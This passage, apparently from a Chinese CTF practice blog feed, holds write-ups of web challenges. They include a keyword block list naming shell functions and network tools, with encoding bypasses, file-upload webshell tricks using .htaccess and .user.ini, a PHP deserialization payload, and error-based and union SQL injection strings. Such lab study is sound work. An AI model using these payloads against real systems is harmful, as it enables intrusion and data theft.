class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;preg&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%0&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;char&#x27;</span>,<span class="hljs-string">&#x27;decode&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;md5&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;ascii&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;replace&#x27;</span>,<span class="hljs-string">&#x27;assert&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;var&#x27;</span>,<span class="hljs-string">&#x27;pastre&#x27;</span>,<span class="hljs-string">&#x27;print&#x27;</span>,<span class="hljs-string">&#x27;tail&#x27;</span>,<span class="hljs-string">&#x27;sed&#x27;</span>,<span class="hljs-string">&#x27;pcre&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;scan&#x27;</span>,<span class="hljs-string">&#x27;decode&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;func&#x27;</span>,<span class="hljs-string">&#x27;diff&#x27;</span>,<span class="hljs-string">&#x27;ini_&#x27;</span>,<span class="hljs-string">&#x27;passthru&#x27;</span>,<span class="hljs-string">&#x27;pcntl&#x27;</span>,<span class="hljs-string">&#x27;proc_open&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;tac&#x27;</span>,<span class="hljs-string">&#x27;more&#x27;</span>,<span class="hljs-string">&#x27;sort&#x27;</span>,<span class="hljs-string">&#x27;log&#x27;</span>,<span class="hljs-string">&#x27;current&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;cut&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;nl&#x27;</span>,<span class="hljs-string">&#x27;wget&#x27;</span>,<span class="hljs-string">&#x27;vi&#x27;</span>,<span class="hljs-string">&#x27;grep&#x27;</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>没有过滤完全编码相关的函数，比如hex2bin<br>我是只把system转换成16进制，里面的函数选了一个没被过滤的rev<br><img src="http://81.70.101.23:11111/i/2022/05/31/pcu5pf_0.png"><br>或者里面也可以直接用hex2bin<br><img src="http://81.70.101.23:11111/i/2022/05/31/pcu5dt_0.png"></p><p>没有想到的两种方法是取反(因为没禁~)和另一个编码str_rot13<br>取反：<br><img src="http://81.70.101.23:11111/i/2022/06/01/uaui5g_0.png"><br>str_rot13：<br><img src="http://81.70.101.23:11111/i/2022/06/01/uaugzp_0.png"></p><h3 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h3><p>首先文件上传有前端验证后缀名<br><img src="http://81.70.101.23:11111/i/2022/06/01/ui05v6_0.png"><br>把javascript禁用掉就行了<br>接着尝试上传一个php木马，发现文件名有限制<br><img src="http://81.70.101.23:11111/i/2022/06/01/ui07ae_0.png"><br>切换文件名，发现除了php后缀都能成功上传而且有路径<br><img src="http://81.70.101.23:11111/i/2022/06/01/ui0di9_0.png"><br>访问发现这个题目没有包含图片马，所以尝试上传.htaccess文件<br>接着上传木马的时候发现文件内容也有限制<br><img src="http://81.70.101.23:11111/i/2022/06/01/ukelyr_0.png"><br>多次尝试得知过滤的是<code>&lt;?</code>标签<br>尝试使用<code>&lt;script language=php</code>标签，但没有成功，推测靶机php版本大于7</p><p>那就要上传一个新的.htaccess文件，用编码绕过(比如base64、UTF-7等)<br>涉及到.htaccess的参数auto_append_file<br><img src="http://81.70.101.23:11111/i/2022/06/01/ui08gq_0.png"><br>接着上传经过base64之后的马就行了<br><img src="http://81.70.101.23:11111/i/2022/06/01/ui04u0_0.png"></p><p><img src="http://81.70.101.23:11111/i/2022/06/01/ui0631_0.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buu刷题-5.11</title>
    <link href="/2022/05/11/buu%E5%88%B7%E9%A2%98-5-11/"/>
    <url>/2022/05/11/buu%E5%88%B7%E9%A2%98-5-11/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>gogogo</p><h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>按联合注入的方法试，发现过滤了很多字符和关键字，比如空格，&#x3D;，by<br>这题可以用报错注入<br>查找库：<br>-1’or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password&#x3D;1</p><p>查找表：<br>-1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1))#</p><p>查找列名：<br>-1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1))#</p><p>查找字段值：<br>-1’or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#<br>发现只能显示一部分，结合right()函数或left()函数<br>-1’or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#</p><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>文件上传<br>简单先从上传php文件开始一步步上传检验后端检验的方法<br><img src="http://81.70.101.23:11111/i/2022/05/11/sfrruh_0.png"><br>显示<code>illegal suffix!</code>（非法后缀）</p><p>然后改后缀，改Content-Type<br><img src="http://81.70.101.23:11111/i/2022/05/11/sfrusm_0.png"><br>显示<code>exif_imagetype:not image!</code><br>联想到exif_imagetype()是PHP中判断是否是图片的一个函数<br>php官方文档是这样描述的：<code>reads the first bytes of an image and checks its signature. </code><br>也就是说要把头几个字节改成图片的特有的那种文件头<br>比如jpg&#x2F;gif头几个字节在文本中显示就是GIF89a</p><p>添加后再尝试<br><img src="http://81.70.101.23:11111/i/2022/05/11/sfru9j_0.png"><br>这里就成功了，还显示了目录和目录下的文件，可以看到有个index.php</p><p>接下来尝试直接蚁剑连图片发现图片没有被解析，上传.htaccess文件也不成功<br>这里的知识点是php.ini类似的.user.ini<br>由用户写，但配置比php.ini少，而且要求当前目录有php文件才能生效<br>选取其中的auto_append_file或者auto_prepend_file配合上传的文件马来制造后门<br>auto_prepend_file&#x3D;script.jpg<br>之后访问该目录下的php文件就会自动包含script.jpg</p><p>上传.user.ini没有被过滤<br><img src="http://81.70.101.23:11111/i/2022/05/11/sfrrfs_0.png"></p><p>接着访问这个index.php<br><img src="http://81.70.101.23:11111/i/2022/05/11/sfs1qp_0.png"><br>能够echo出a说明我的马上传成功了</p><p>蚁剑连接，读根目录flag<br><img src="http://81.70.101.23:11111/i/2022/05/11/sfru57_0.png"></p><p>顺便把后端代码上传一下吧</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// error_reporting(0);</span><br><span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;/index.php&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;upload&quot;</span>])) &#123;<br>    <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;fileUpload&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;fileUpload&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$tmp_name</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;filesize too big!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$name</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;filename cannot be empty!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph|htacess/i&quot;</span>, <span class="hljs-variable">$extension</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal suffix!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&quot;&lt;?&quot;</span>) !== <span class="hljs-literal">FALSE</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&amp;lt;? in contents!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;exif_imagetype:not image!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$upload_file_path</span> = <span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-variable">$name</span>;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$upload_file_path</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your dir &quot;</span> . <span class="hljs-variable">$userdir</span>. <span class="hljs-string">&#x27; &lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your files : &lt;br&gt;&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$userdir</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><p>代码看着挺吓人的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;filename, <span class="hljs-variable language_">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable language_">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>但好在就在一个FileHandler类里，只是方法比较多，其中write和read两个方法应该比较重要<br>后面是对传入str参数的ascii值检验，要求在32~125间，然后就是反序列化了</p><p>读一下类里的方法，利用write可以尝试写入木马，利用read可以尝试直接读flag<br>后来实操的时候发现write方法里发现写不进去</p><p>尝试read方法，需要$this-&gt;op &#x3D;&#x3D; “2”，为了绕过__destruct方法里的与”2”的强比较，前面的弱比较可以用op &#x3D; 2</p><p>下面的两种payload涉及两个不同的漏洞</p><p>一是protected变量序列化的时候会产生\00不可见字符，序列化为<code>不可见字符+ * +不可见字符+变量名</code>，ascii值为0。在PHP7.1以上，对属性的类型不敏感，可以将protected改成public，就不会出现不可见字符了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;HelloWorld!&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>payload:<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;s:11:&quot;HelloWorld!&quot;;&#125;</code></p><p>二是仍然使用protected变量，将不可见字符手动换成%00，不行的话换成\00，但是反序列化的时候仍会变为不可见字符。这里在序列化内容的时候用大写S，就能使后面的不可见字符用16进制表示。<br>这里参看<a href="https://t.zsxq.com/f23vBAu">p神的文章</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;HelloWorld!&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//然后手动将不可见字符替换、将小写s替换</span><br></code></pre></td></tr></table></figure><p>payload：<code>O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:11:&quot;HelloWorld!&quot;;&#125;</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow刷题-5.10</title>
    <link href="/2022/05/10/ctfshow%E5%88%B7%E9%A2%98-5.10/"/>
    <url>/2022/05/10/ctfshow%E5%88%B7%E9%A2%98-5.10/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ctfshow买了都没咋刷完，准备buu和ctfshow交替来刷<br>从sql注入开始刷吧，我的sql真的很烂</p><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>联合注入</p><p>查列数：<br>?id&#x3D;-1’ order by 1–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 2–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 3–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 4–+       &#x2F;&#x2F;数据接口请求异常：parsererror<br>说明有三列</p><p>查库名：<br>?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p><p>查表名：<br>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctfshow_web’–+</p><p>查列名：<br>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’ctfshow_user’–+</p><p>查字段：<br>?id&#x3D;-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password)) from ctfshow_web.ctfshow_user–+</p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>联合注入</p><p>查列数：<br>?id&#x3D;-1’ order by 1–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 2–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 3–+       &#x2F;&#x2F;数据接口请求异常：parsererror<br>说明有两列</p><p>查库名：<br>?id&#x3D;-1’ union select 1,group_concat(schema_name) from information_schema.schemata–+</p><p>查表名：<br>?id&#x3D;-1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctfshow_web’–+</p><p>查列名：<br>?id&#x3D;-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’ctfshow_user2’–+</p><p>查字段：<br>?id&#x3D;-1’ union select 1,group_concat(concat_ws(‘~’,to_base64(username),hex(password))) from ctfshow_web.ctfshow_user2–+</p><p>虽然这题逻辑上不能返回flag，但直接联合注入还是能用的，因为返回的是一大串字符串，包含’flag’，但不是&#x3D;&#x3D;&#x3D;flag<br>如果用preg_match绕过，可以用编码的形式绕过，比如<br>?id&#x3D;-1’ union select 1,group_concat(concat_ws(‘~’,username,password)) from ctfshow_web.ctfshow_user2–+</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>联合注入</p><p>查列数：<br>?id&#x3D;-1’ order by 1–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 2–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 3–+       &#x2F;&#x2F;无数据<br>?id&#x3D;-1’ order by 4–+       &#x2F;&#x2F;数据接口请求异常：parsererror<br>说明有三列</p><p>查库名：<br>?id&#x3D;-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p><p>查表名：<br>?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctfshow_web’–+</p><p>查列名：<br>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where 